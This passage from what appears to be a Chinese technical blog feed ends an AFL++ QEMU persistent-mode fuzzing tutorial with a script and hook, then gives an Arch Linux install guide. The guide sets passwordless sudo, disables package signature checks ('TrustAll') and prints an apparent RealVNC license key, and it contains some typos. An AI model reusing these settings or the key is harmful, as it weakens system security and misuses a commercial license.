<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">export QEMU_LD_PREFIX=/usr/aarch64-linux-gnu</span><br><span class="line">export LD_LIBRARY_PATH=./lib</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">export</span> AFL_INST_LIBS=1</span></span><br><span class="line">export AFL_ENTRYPOINT=0x5500001480</span><br><span class="line">export AFL_QEMU_PERSISTENT_ADDR=0x5500001480</span><br><span class="line">export AFL_QEMU_PERSISTENT_RET=0x5500001668</span><br><span class="line">export AFL_QEMU_PERSISTENT_GPR=1</span><br><span class="line">export AFL_QEMU_PERSISTENT_EXITS=1</span><br><span class="line">export AFL_QEMU_PERSISTENT_CNT=1000</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">export</span> AFL_DEBUG=1</span></span><br><span class="line">afl-fuzz -i ./input -o ./output -Q -m 10240 -- ./bin/cjpeg @@</span><br></pre></td></tr></table></figure>

<ul>
<li>目标中的循环越稳定，可以运行的时间越长，循环越不稳定，循环计数应该越低。较低值为 100，最大值应为 10000。默认值为 1000。可以使用 <code>AFL_QEMU_PERSISTENT_CNT</code> 设置该值（根据具体情况适当调整该值即可，这里设为 1000）</li>
</ul>
<p>发现第一个 crash 用时 8s，exec speed 在 6000+&#x2F;sec </p>
<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture202408130906519.png" alt="aqexs3jf.v4a" style="zoom:80%;" />



<h2 id="内存模糊测试"><a href="#内存模糊测试" class="headerlink" title="内存模糊测试"></a>内存模糊测试</h2><p>目标：直接从模糊器的内存中读取输入，跳过文件打开读取操作</p>
<p>钩子：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Inspired by https://github.com/AFLplusplus/AFLplusplus/blob/stable/utils/qemu_persistent_hook/read_into_rdi.c</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;api.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> g2h(x) ((void *)((unsigned long)(x) + guest_base))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> h2g(x) ((uint64_t)(x) - guest_base)</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">afl_persistent_hook</span><span class="params">(<span class="keyword">struct</span> arm64_regs *regs, <span class="type">uint64_t</span> guest_base, <span class="type">uint8_t</span> *input_buf, <span class="type">uint32_t</span> input_buf_len)</span> &#123;</span><br><span class="line">  <span class="comment">// Make sure we don&#x27;t overflow the target buffer</span></span><br><span class="line">  <span class="keyword">if</span> (input_buf_len &gt; <span class="number">4096</span>)</span><br><span class="line">    input_buf_len = <span class="number">4096</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Copy the fuzz data to the target&#x27;s memory</span></span><br><span class="line">  <span class="built_in">memcpy</span>(g2h(regs-&gt;x0), input_buf, input_buf_len);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 根据实际情况修改寄存器的数据</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">afl_persistent_hook_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="comment">// 1 for shared memory input (faster), 0 for normal input (you have to use</span></span><br><span class="line">  <span class="comment">// read(), input_buf will be NULL)</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>注意: <code>api.h</code> 来自 <code>AFLplusplus/qemu_mode/qemuafl/qemuafl/api.h</code></li>
<li>编译 hook 代码：<code>gcc -shared -fPIC -o libhook.so hook.c</code></li>
<li>加载 hook 代码：<code>export AFL_QEMU_PERSISTENT_HOOK=&quot;./libhook.so&quot;</code></li>
</ul>
<p>修改持续模式的 START 地址到待测试的目标函数，根据反汇编信息，修改各参数对应的寄存器数据，启动模糊测试（暂无实例演示）</p>
]]></content>
      <categories>
        <category>Tool</category>
      </categories>
      <tags>
        <tag>Fuzzing</tag>
        <tag>Tutorial</tag>
      </tags>
  </entry>
  <entry>
    <title>Arch Linux 折腾记</title>
    <url>/2020/03/04/Arch/</url>
    <content><![CDATA[<h1 id="Arch-Linux-安装及配置"><a href="#Arch-Linux-安装及配置" class="headerlink" title="Arch Linux 安装及配置"></a>Arch Linux 安装及配置</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><blockquote>
<p>对小白很友好的安装教程：<a href="https://www.bilibili.com/video/av81146687">https://www.bilibili.com/video/av81146687</a></p>
<p>有基础的请自行查看 ArchWiki 上最新的<a href="https://wiki.archlinuxcn.org/wiki/%E5%AE%89%E8%A3%85%E6%8C%87%E5%8D%97">安装教程</a></p>
</blockquote>
<h3 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h3><p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200304150816592.png" alt="VMware UEFI引导"></p>
<p>默认选择第一个进入安装页面：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200304150900152.png"></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200304151037265.png"></p>
<p><code>ip link</code> 查看互联网设备</p>
<p><code>ip addr</code> 查看当前 ip 地址信息</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200304151254501.png" alt="image-20200304151254501"></p>
<ul>
<li>开启 ntp 服务更新系统时间:</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">timedatectl set-ntp true</span><br></pre></td></tr></table></figure>



<h4 id="磁盘分区"><a href="#磁盘分区" class="headerlink" title="磁盘分区"></a>磁盘分区</h4><ul>
<li>查看当前磁盘设备：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200304151648520.png" alt="image-20200304151648520"></p>
<ul>
<li>分区说明</li>
</ul>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200304151907375.png"></p>
<table>
<thead>
<tr>
<th>分区</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>&#x2F;boot</td>
<td>引导分区</td>
</tr>
<tr>
<td>&#x2F;</td>
<td>主分区</td>
</tr>
<tr>
<td>swap</td>
<td>交换空间，相当于虚拟内存</td>
</tr>
</tbody></table>
<ul>
<li>进行磁盘分区</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cfdisk # 一个图形化的分区工具, 操作简单</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200304152332949.png" alt="选择gpt"></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200304152452030.png" alt="设置各分区"></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200304152554256.png" alt="执行write操作后"></p>
<ul>
<li>进行磁盘格式化</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkfs.fat -F32 /dev/sda1 # 引导分区必须格式化为FAT32格式</span><br><span class="line">mkfs.ext4 /dev/sda3		# 系统主分区格式化</span><br><span class="line">mkswap /dev/sda2		# 交换空间格式化</span><br><span class="line">swapon /dev/sda2		# 启用交换空间</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200304152851864.png" alt="image-20200304152851864"></p>
<h4 id="修改安装源顺序"><a href="#修改安装源顺序" class="headerlink" title="修改安装源顺序"></a>修改安装源顺序</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/pacman.d/mirrorlist</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200304153612268.png" alt="将国内源置于最顶部"></p>
<h4 id="挂载分区"><a href="#挂载分区" class="headerlink" title="挂载分区"></a>挂载分区</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mount /dev/sda3 /mnt		# 挂载根目录</span><br><span class="line">mkdir /mnt/boot				# 创建引导目录</span><br><span class="line">mount /dev/sda1 /mnt/boot	# 挂载引导目录</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200304153829387.png" alt="image-20200304153829387"></p>
<h4 id="执行安装"><a href="#执行安装" class="headerlink" title="执行安装"></a>执行安装</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacstrap /mnt base linux linux-firmware # 安装Arch、linux、linux框架</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200304154059922.png" alt="安装完成"></p>
<h4 id="生成fstab文件"><a href="#生成fstab文件" class="headerlink" title="生成fstab文件"></a>生成fstab文件</h4><ul>
<li>fstab 是用来存放文件系统的静态信息的文件，当系统启动的时候，系统会自动地从这个文件读取信息，并且会自动将此文件中指定的文件系统挂载到指定的目录。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">genfstab -U /mnt &gt;&gt; /mnt/etc/fstab</span><br></pre></td></tr></table></figure>

<h4 id="进入系统进行配置"><a href="#进入系统进行配置" class="headerlink" title="进入系统进行配置"></a>进入系统进行配置</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arch-chroot /mnt # 进入安装好之后的系统</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200304154337458.png" alt="image-20200304154337458"></p>
<ul>
<li>设置时区</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime</span><br></pre></td></tr></table></figure>

<ul>
<li>同步时间</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hwclock --systohc</span><br></pre></td></tr></table></figure>

<ul>
<li>安装相关基础软件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -Sy # 更新安装源信息</span><br><span class="line">pacman -S vim</span><br></pre></td></tr></table></figure>

<ul>
<li>本地化</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/locale.gen</span><br></pre></td></tr></table></figure>

<p>去除 <code>en_US.UTF-8 UTF-8</code> 和 <code>zh_CN.UTF-8 UTF-8</code> 前面的 #</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">locale-gen</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200304155023590.png" alt="image-20200304155023590"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/locale.conf</span><br><span class="line"></span><br><span class="line">LANG=en_US.UTF-8	# 设置系统语言为英语</span><br></pre></td></tr></table></figure>

<ul>
<li>设置hosts</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/hostname</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200304155406391.png" alt="image-20200304155406391"></p>
<ul>
<li>设置登录密码</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">passwd</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200304155434937.png" alt="image-20200304155434937"></p>
<h4 id="创建新用户"><a href="#创建新用户" class="headerlink" title="创建新用户"></a>创建新用户</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">useradd -m xxx</span><br><span class="line">passwd xxx</span><br><span class="line">usermod -aG wheel,audio,video,optical,storage xxx</span><br><span class="line">visudo</span><br><span class="line">xxx ALL=(ALL) ALL</span><br><span class="line">xxx ALL=(ALL)NOPASSWD:ALL</span><br></pre></td></tr></table></figure>



<h4 id="安装引导"><a href="#安装引导" class="headerlink" title="安装引导"></a>安装引导</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S grub efibootmgr intel-ucode os-prober</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">efibootmgr EFI启动需安装</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">intel-ucode 或 amd-ucode</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">os-prober 多系统需安装</span></span><br><span class="line"></span><br><span class="line">mkdir /boot/grub</span><br><span class="line"></span><br><span class="line">grub-mkconfig &gt; /boot/grub/grub.cfg	# 生成配置文件</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200304155753419.png" alt="image-20200304155753419"></p>
<p>确认系统架构：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">uname -m</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200304155834476.png" alt="确认系统架构"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grub-install --target=x86_64-efi --efi-directory=/boot</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200304155947052.png" alt="安装grub"></p>
<h4 id="安装一些基础软件"><a href="#安装一些基础软件" class="headerlink" title="安装一些基础软件"></a>安装一些基础软件</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S net-tools networkmanager dhcpcd openssh</span><br></pre></td></tr></table></figure>

<h4 id="退出重启"><a href="#退出重启" class="headerlink" title="退出重启"></a>退出重启</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">exit</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>



<p>安装结束</p>
<h3 id="物理机"><a href="#物理机" class="headerlink" title="物理机"></a>物理机</h3><p>安装步骤同虚拟机，分区挂载视具体情况确定。</p>
<p><strong>无线网络启用</strong>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S iw</span><br><span class="line">ip link set wlp0s20f3 up # 开启网卡, 网卡名称视实际情况自行修改</span><br><span class="line">nmcli dev wifi # 扫描无线网络</span><br><span class="line">iw dev wlp0s20f3 scan | grep SSID # 扫描无线网络</span><br></pre></td></tr></table></figure>



<h2 id="桌面安装"><a href="#桌面安装" class="headerlink" title="桌面安装"></a>桌面安装</h2><blockquote>
<p>该部分参考：</p>
<p><a href="https://blog.csdn.net/ackjack_niuniu/article/details/12996987">https://blog.csdn.net/ackjack_niuniu/article/details/12996987</a></p>
<p><a href="https://www.cnblogs.com/kainhuck/p/10698671.html">https://www.cnblogs.com/kainhuck/p/10698671.html</a></p>
</blockquote>
<h3 id="1-安装sddm"><a href="#1-安装sddm" class="headerlink" title="1.安装sddm"></a>1.安装sddm</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S sddm sddm-kcm</span><br></pre></td></tr></table></figure>

<h3 id="2-开启sddm服务"><a href="#2-开启sddm服务" class="headerlink" title="2.开启sddm服务"></a>2.开启sddm服务</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl enable sddm</span><br></pre></td></tr></table></figure>

<h3 id="3-安装KDE桌面"><a href="#3-安装KDE桌面" class="headerlink" title="3.安装KDE桌面"></a>3.安装KDE桌面</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S plasma kde-applications</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/2020-04-13_12-08.png" alt="我的KDE桌面"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S conky # 一个系统监控的工具</span><br></pre></td></tr></table></figure>



<h2 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h2><h3 id="中文字体及美化"><a href="#中文字体及美化" class="headerlink" title="中文字体及美化"></a>中文字体及美化</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装字体</span></span><br><span class="line">pacman -S wqy-zenhei wqy-microhei ttf-arphic-ukai ttf-arphic-uming </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">手动安装字体</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">把TTF字体复制到 /usr/share/fonts/TTF目录下</span></span><br><span class="line">fc-cache -vf # 更新字体库</span><br></pre></td></tr></table></figure>

<p>字体美化：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/b7de7e09c93d70cf828f82ecf1dcd100bba12b3e.jpg" alt="该图片源自百度贴吧"></p>
<p>另外可从Windows中拷贝TTF字体：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">C:/Windows/System32/Fonts</span><br></pre></td></tr></table></figure>



<h3 id="软件包相关配置"><a href="#软件包相关配置" class="headerlink" title="软件包相关配置"></a>软件包相关配置</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">yay安装</span></span><br><span class="line">pacman -S base-devel</span><br><span class="line">git clone https://aur.archlinux.org/pakku.git</span><br><span class="line">cd pakku</span><br><span class="line">makepkg -si</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">yaourt</span></span><br><span class="line">pacman -S yaourt</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">图形化软件包管理</span></span><br><span class="line">pacman -S pamac-aur</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置/etc/pacman.conf，文件末尾添加</span></span><br><span class="line">[archlinuxcn]</span><br><span class="line">SigLevel = Optional TrustAll</span><br><span class="line">Server = https://mirrors.ustc.edu.cn/archlinuxcn/$arch</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="安装配置输入法"><a href="#安装配置输入法" class="headerlink" title="安装配置输入法"></a>安装配置输入法</h3><blockquote>
<p><a href="https://zhuanlan.zhihu.com/p/74931620">https://zhuanlan.zhihu.com/p/74931620</a></p>
<p>KDE桌面环境</p>
<p>（需要archlinuxcn源）</p>
</blockquote>
<ul>
<li>该方法现已有BUG，安装失败（2020-07-14）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -S fcitx-lilydjwg-git fcitx-sogoupinyin</span><br><span class="line">sudo pacman -S kcm-fcitx</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim ~/.xprofile</span><br><span class="line"></span><br><span class="line">export GTK_IM_MODULE=fcitx</span><br><span class="line">export QT_IM_MODULE=fcitx</span><br><span class="line">export XMODIFIERS=&quot;@im=fcitx&quot;</span><br></pre></td></tr></table></figure>



<h3 id="硬件相关"><a href="#硬件相关" class="headerlink" title="硬件相关"></a>硬件相关</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">modprobe acpi-cpufreq</span><br></pre></td></tr></table></figure>



<h4 id="硬盘分区支持"><a href="#硬盘分区支持" class="headerlink" title="硬盘分区支持"></a>硬盘分区支持</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ntfs挂载支持</span></span><br><span class="line">pacman -S ntfs-3g gvfs-mtp </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">exfat格式化支持</span></span><br><span class="line">pacman -S exfat-utils</span><br></pre></td></tr></table></figure>



<h4 id="显卡驱动"><a href="#显卡驱动" class="headerlink" title="显卡驱动"></a>显卡驱动</h4><blockquote>
<p>Intel wiki: <a href="https://wiki.archlinux.org/index.php/Intel_graphics_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">https://wiki.archlinux.org/index.php/Intel_graphics_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)</a><br>NVIDIA wiki: <a href="https://wiki.archlinux.org/index.php/NVIDIA_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">https://wiki.archlinux.org/index.php/NVIDIA_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)</a></p>
</blockquote>
<p><a href="https://www.cnblogs.com/tonyc/p/7732119.html">https://www.cnblogs.com/tonyc/p/7732119.html</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S nvidia bbswitch optimus-manager-qt-kde </span><br></pre></td></tr></table></figure>





<h4 id="蓝牙驱动"><a href="#蓝牙驱动" class="headerlink" title="蓝牙驱动"></a>蓝牙驱动</h4><blockquote>
<p><a href="https://www.jianshu.com/p/b340992b06dc">https://www.jianshu.com/p/b340992b06dc</a></p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -S bluez bluez-utils</span><br><span class="line"></span><br><span class="line">systemctl start bluetooth.service</span><br><span class="line">systemctl enable bluetooth.service</span><br></pre></td></tr></table></figure>



<h4 id="触摸板驱动"><a href="#触摸板驱动" class="headerlink" title="触摸板驱动"></a>触摸板驱动</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S xf86-input-synaptics # 笔记本触摸板驱动</span><br></pre></td></tr></table></figure>



<h4 id="摄像头"><a href="#摄像头" class="headerlink" title="摄像头"></a>摄像头</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S cheese</span><br></pre></td></tr></table></figure>



<h4 id="多屏幕"><a href="#多屏幕" class="headerlink" title="多屏幕"></a>多屏幕</h4><blockquote>
<p>wiki: <a href="https://wiki.archlinux.org/index.php/Multihead_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">https://wiki.archlinux.org/index.php/Multihead_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)</a></p>
</blockquote>
<h4 id="配置声音"><a href="#配置声音" class="headerlink" title="配置声音"></a>配置声音</h4><blockquote>
<p><a href="https://www.jianshu.com/p/43a03df9acb3">https://www.jianshu.com/p/43a03df9acb3</a><br><a href="https://wiki.archlinux.org/index.php/Advanced_Linux_Sound_Architecture_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">https://wiki.archlinux.org/index.php/Advanced_Linux_Sound_Architecture_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)</a></p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S alsa-utils # 声卡驱动</span><br><span class="line">pacman -S pavucontrol # 可视化声卡配置</span><br><span class="line">pacman -S pulseeffects # 音效</span><br></pre></td></tr></table></figure>

<blockquote>
<p>使用PulseEffect调整全局音效: <a href="https://ywnz.com/linuxjc/3788.html">https://ywnz.com/linuxjc/3788.html</a></p>
<p>Linux音效软件 PulseEffects App 3.2.1:<a href="https://www.bilibili.com/video/av21958431/">https://www.bilibili.com/video/av21958431/</a></p>
</blockquote>
<h4 id="电源管理"><a href="#电源管理" class="headerlink" title="电源管理"></a>电源管理</h4><blockquote>
<p><a href="https://www.jianshu.com/p/894d24567a70">https://www.jianshu.com/p/894d24567a70</a></p>
<p><a href="https://wiki.archlinux.org/index.php/TLP_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">https://wiki.archlinux.org/index.php/TLP_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)</a></p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -S tlp tlp-rdw tlpui-git</span><br><span class="line"></span><br><span class="line">sudo systemctl enable tlp.service</span><br><span class="line">sudo systemctl enable tlp-sleep.service</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">屏蔽以下服务以避免冲突，并确保 TLP 的无线电设备切换选项的正确操作</span></span><br><span class="line">sudo systemctl mask systemd-rfkill.service</span><br><span class="line">sudo systemctl mask systemd-rfkill.socket</span><br><span class="line"></span><br><span class="line">sudo tlp-stat -b # 显示电池信息</span><br><span class="line"></span><br><span class="line">sudo vim /etc/tlp.conf	# 配置文件路径</span><br></pre></td></tr></table></figure>



<h3 id="sudo配置"><a href="#sudo配置" class="headerlink" title="sudo配置"></a>sudo配置</h3><blockquote>
<p><a href="https://wiki.archlinux.org/index.php/Sudo_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">https://wiki.archlinux.org/index.php/Sudo_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)</a></p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S sudo</span><br></pre></td></tr></table></figure>



<h2 id="常用软件"><a href="#常用软件" class="headerlink" title="常用软件"></a>常用软件</h2><blockquote>
<p><a href="https://wiki.archlinux.org/index.php/List_of_applications_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">https://wiki.archlinux.org/index.php/List_of_applications_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)</a></p>
</blockquote>
<h3 id="虚拟机-1"><a href="#虚拟机-1" class="headerlink" title="虚拟机"></a>虚拟机</h3><h4 id="VMware-Workstation"><a href="#VMware-Workstation" class="headerlink" title="VMware Workstation"></a>VMware Workstation</h4><h4 id="VirtualBox"><a href="#VirtualBox" class="headerlink" title="VirtualBox"></a>VirtualBox</h4><h4 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h4><blockquote>
<p><a href="https://wiki.archlinux.org/index.php/Docker_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">https://wiki.archlinux.org/index.php/Docker_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)</a></p>
</blockquote>
<h3 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S chromiun vivaldi opera opera-ffmpeg-codecs</span><br><span class="line">yay -S flashplugin-focusfix # firefox的flash插件</span><br><span class="line">yay -S google-chrome-beta </span><br></pre></td></tr></table></figure>

<h3 id="Office"><a href="#Office" class="headerlink" title="Office"></a>Office</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -S wps-office-cn			# 安装WPS</span><br><span class="line">sudo pacman -S wps-office-mui-zh-cn		# 安装中文语言包</span><br></pre></td></tr></table></figure>

<h3 id="多媒体软件"><a href="#多媒体软件" class="headerlink" title="多媒体软件"></a>多媒体软件</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S nomacs # 图片</span><br><span class="line">pacman -S gimp # 图片编辑</span><br><span class="line">pacman —S krita # 画板</span><br><span class="line">pacman -S mypaint # 画图板</span><br><span class="line">pacman -S mpv # 视频</span><br><span class="line">pacman -S sox # 终端音频播放</span><br><span class="line">pacman -S cmus # 终端音乐播放器</span><br><span class="line">pacman -S handbrake handbrake-cli # 视频压缩转码</span><br><span class="line">yay -S losslesscut # 视频剪切工具</span><br><span class="line">pacman -S simplescreenrecorder # 录屏工具</span><br><span class="line">pacman -S deepin-screen-recorder # deepin录屏工具</span><br><span class="line">pacman -S deepin-screenshot # deepin录音工具</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200310214323308.png" alt="gimp"></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200310213834026.png" alt="cmus"></p>
<h3 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h3><ul>
<li>Typora</li>
</ul>
<h3 id="wine-放弃使用，体验极差"><a href="#wine-放弃使用，体验极差" class="headerlink" title="wine(放弃使用，体验极差)"></a>wine(放弃使用，体验极差)</h3><blockquote>
<p><a href="https://www.jianshu.com/p/a49fe89ae0f6">https://www.jianshu.com/p/a49fe89ae0f6</a></p>
<p><a href="https://taifua.com/ubuntu16-wine-tim.html">https://taifua.com/ubuntu16-wine-tim.html</a></p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -S wine wine-mono wine_gecko</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置</span></span><br><span class="line">env WINEPREFIX=&quot;$HOME/.deepinwine/Deepin-TIM&quot; winecfg</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -S playonlinux</span><br></pre></td></tr></table></figure>



<h3 id="远程桌面"><a href="#远程桌面" class="headerlink" title="远程桌面"></a>远程桌面</h3><p>RealVNC</p>
<blockquote>
<p><a href="https://blog.csdn.net/cc1969281777/article/details/100116496">https://blog.csdn.net/cc1969281777/article/details/100116496</a></p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/usr/bin/vnclicense -add VKUPN-MTHHC-UDHGS-UWD76-6N36A</span><br></pre></td></tr></table></figure>



<h3 id="解压缩"><a href="#解压缩" class="headerlink" title="解压缩"></a>解压缩</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pacman -S p7zip rar zip unzip</span><br></pre></td></tr></table></figure>



